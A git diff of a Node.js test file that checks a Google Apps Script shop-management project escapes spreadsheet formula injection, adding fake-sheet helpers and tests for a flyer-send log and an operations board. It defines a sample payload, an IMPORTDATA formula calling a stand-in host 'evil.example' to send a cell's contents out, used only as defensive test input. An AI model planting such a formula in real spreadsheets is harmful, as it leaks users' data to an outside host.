@@ -17,7 +17,10 @@ const vm = require('node:vm');
 
 const V7 = path.join(__dirname, '..', 'v7');
 const FILES = ['Config.gs', 'SheetHelpers.gs', 'ForumTopicManager.gs', 'ShopRouting.gs',
-  'CustomerChat.gs', 'Router.gs', 'FunnelLog.gs'];
+  'CustomerChat.gs', 'Router.gs', 'FunnelLog.gs', 'PartnerSelfRegister.gs'];
+// 営業ボード（v7-operations・別の GAS プロジェクト）は v7 のシートを読み戻して書く
+const OPS = path.join(__dirname, '..', 'v7-operations');
+const OPS_FILES = ['FieldExpense.gs', 'ScoutBoard.gs'];
 
 const EVIL = '=IMPORTDATA("https://evil.example/?"&A1)';
 
@@ -35,8 +38,13 @@ function isDate(v) { return Object.prototype.toString.call(v) === '[object Date]
 
 /** スプレッドシートが数式として動かすか（数字だけの文字列は数値になるだけなので除く） */
 function wouldRunAsFormula(raw) {
-  return typeof raw === 'string' && /^[=+\-@]/.test(raw) && !/^[+\-]?\d+(\.\d+)?$/.test(raw);
+  return typeof raw === 'string' && /^[=+\-@]/.test(raw) && !/^[+\-]?(\d+(\.\d*)?|\.\d+)$/.test(raw);
 }
+
+/** 書式だけ変えるメソッドは何もせず自分を返す */
+const NOOP_RANGE = ['setFontWeight', 'setBackground', 'setWrap', 'setVerticalAlignment', 'setFontColor',
+  'setNumberFormat', 'setHorizontalAlignment'];
+const NOOP_SHEET = ['setColumnWidth', 'setFrozenRows'];
 
 class FakeRange {
   constructor(sheet, row, col, nr, nc) { Object.assign(this, { sheet, row, col, nr: nr || 1, nc: nc || 1 }); }
@@ -56,6 +64,7 @@ class FakeRange {
   }
   setValue(v) { this.sheet.put(this.row, this.col, v); return this; }
 }
+NOOP_RANGE.forEach((m) => { FakeRange.prototype[m] = function() { return this; }; });
 
 class FakeSheet {
   constructor(name, rows) { this.name = name; this.raw = rows.map((r) => r.slice()); }
@@ -69,9 +78,12 @@ class FakeSheet {
     while (this.raw.length < row) this.raw.push([]);
     this.raw[row - 1][col - 1] = v;
   }
+  getFilter() { return null; }
+  clear() { this.raw = []; return this; }
   /** 見出しの列名で raw を引く */
   rawAt(row, header) { return this.raw[row - 1][this.raw[0].indexOf(header)]; }
 }
+NOOP_SHEET.forEach((m) => { FakeSheet.prototype[m] = function() { return this; }; });
 
 function memoryStore() {
   const m = {};
@@ -93,6 +105,7 @@ function memoryStore() {
 function loadV7(sheets) {
   const ss = {
     getSheetByName: (n) => sheets[n] || null,
+    insertSheet: (n) => (sheets[n] = new FakeSheet(n, [])),
     getSpreadsheetTimeZone: () => 'Asia/Phnom_Penh'
   };
   const props = memoryStore();
@@ -152,6 +165,10 @@ test('sheetSafeText_ / sheetSafeValue_: 先頭が = + - @ の文字列だけ \' 
   assert.equal(ctx.sheetSafeValue_(true), true);
   assert.equal(ctx.sheetSafeValue_('-1001234567890'), '-1001234567890');
   assert.equal(ctx.sheetSafeValue_('12.5'), '12.5');
+  assert.equal(ctx.sheetSafeValue_('-.5'), '-.5');
+  assert.equal(ctx.sheetSafeValue_('+5.'), '+5.');
+  assert.equal(ctx.sheetSafeValue_('-5+3'), "'-5+3", '計算式は数字だけの文字列ではない');
+  assert.equal(ctx.sheetSafeValue_('-1e3'), "'-1e3");
   assert.equal(ctx.sheetSafeValue_(EVIL), "'" + EVIL);
   assert.equal(ctx.sheetSafeValue_(''), '');
 });
@@ -229,4 +246,32 @@ test('ファネルログ: まとめて書き出す時（flushFunnelQueue_）も 
   assert.equal(fl.rawAt(2, 'チャットID'), "'" + EVIL);
   assert.equal(fl.rawAt(2, 'イベント'), 'miniapp_opened');
   assert.ok(isDate(fl.rawAt(2, 'タイムスタンプ')));
+});
+
+test('紹介チラシ送付履歴: 店マスターから読み戻した名前も \' 付き、グループ chat_id は数値のまま（logPartnerFlyerSend_）', () => {
+  const sheets = freshSheets();
+  const { ctx } = loadV7(sheets);
+  ctx.logPartnerFlyerSend_({ '送った日時': '2026-10-27 12:00:00', 'パートナーID': '011', '名前': EVIL, 'shop_id': 'PTN-011',
+    'チラシの版': 'v1.0', '枚数': 2, '送り方': '予約Bot（自動）', '送り先（グループchat_id）': '-1001234567890', 'URL': 'https://example.com/a.png' });
+  const log = sheets['紹介チラシ送付履歴'];
+  assert.ok(log, '送付履歴タブが作られる');
+  assert.equal(log.rawAt(2, '名前'), "'" + EVIL);
+  assert.equal(log.rawAt(2, '送り先（グループchat_id）'), '-1001234567890');
+  assert.equal(log.rawAt(2, '枚数'), 2);
+});
+
+test('営業ボード（v7-operations）: Bot連携から読み戻したグループ名を書き出しても数式にならない（scoutBoardTable_）', () => {
+  const ctx = { console, Logger: { log: () => {} } };
+  vm.createContext(ctx);
+  OPS_FILES.forEach((f) => vm.runInContext(fs.readFileSync(path.join(OPS, f), 'utf8'), ctx, { filename: f }));
+  const sh = new FakeSheet('🔗 連携', []);
+  // v7 が ' 付きで保存したグループ名は、読み戻すと ' が外れて届く
+  const groupName = cellValue("'" + EVIL);
+  const n = ctx.scoutBoardTable_(sh, 1, ['店名 (Shop)', '売上', 'グループ名', 'グループchat_id'],
+    [['Test Garage', 120.5, groupName, '-1001234567890']], [], []);
+  assert.equal(n, 2);
+  assert.equal(sh.raw[1][2], "'" + EVIL);
+  assert.equal(sh.raw[1][1], 120.5, '数値はそのまま');
+  assert.equal(sh.raw[1][3], '-1001234567890', '数字だけの文字列はそのまま');
+  sh.raw.forEach((r) => r.forEach((v) => assert.ok(!wouldRunAsFormula(v), '数式になるセルが無い: ' + v)));
 });
